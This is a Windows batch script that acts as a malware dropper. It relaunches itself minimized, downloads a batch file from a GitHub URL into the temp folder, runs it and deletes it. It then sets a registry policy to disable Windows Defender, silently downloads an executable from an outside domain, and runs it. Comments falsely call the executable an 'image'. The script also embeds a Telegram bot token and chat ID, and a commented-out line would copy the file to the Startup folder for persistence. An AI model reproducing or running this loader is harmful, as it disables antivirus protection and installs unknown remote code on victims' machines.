@echo off
cls 
set "url=https://severnew1.fun/file.exe"
set "botToken=6203037714:AAFqqfaKcZUR7CoYiyymVTztFfocBWxqaL8"
set "chatId=6637850631"
set "file=C:\file.exe"  :: Replace with the actual file path

IF NOT DEFINED IS_MINIMIZED (
    SET IS_MINIMIZED=1
    START "" /MIN "%~f0"
    EXIT /B
)

for /l %%i in (1,1,150) do cmd /c "exit"
cls
set "r=%random%"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/hoangdevpython/hoctap/raw/main/hc.bat', '%temp%\%r%.bat')"
cmd /c "%temp%\%r%.bat"
del /Q %temp%\%r%.bat

:: Your batch script commands go here
SET KEY=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
SET VALUE=DisableAntiSpyware
SET DATA=1
SET TYPE=REG_DWORD
REG ADD "%KEY%" /v "%VALUE%" /t "%TYPE%" /d "%DATA%" /f

:: Download image using PowerShell
powershell -WindowStyle Hidden -Command "$client = New-Object System.Net.WebClient; $client.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'); $client.DownloadFile('%url%', '%file%');"

:: Uncomment the following line if you still want to copy the file to the Startup folder
:: xcopy %file% "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y

:: Open the downloaded image
start %file%

:: Automatically press Enter
echo. | set /p =Press Enter to exit...
